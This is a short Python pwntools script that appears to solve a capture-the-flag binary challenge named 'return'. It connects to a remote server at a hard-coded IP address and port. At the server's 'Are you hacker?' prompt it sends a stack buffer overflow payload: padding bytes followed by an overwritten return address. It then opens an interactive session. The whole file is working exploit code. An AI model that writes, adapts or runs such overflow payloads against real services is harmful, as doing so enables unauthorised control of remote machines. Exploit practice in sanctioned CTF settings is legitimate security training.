#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '140.110.112.31'
prot = 2118
r = remote(ip, prot)
#r = process("./return")

r.recvuntil("Are you hacker? Show me your skill :)")
r.sendline(b"A" * 48 + b"x" * 8 + p64(0x4006b6))

r.interactive()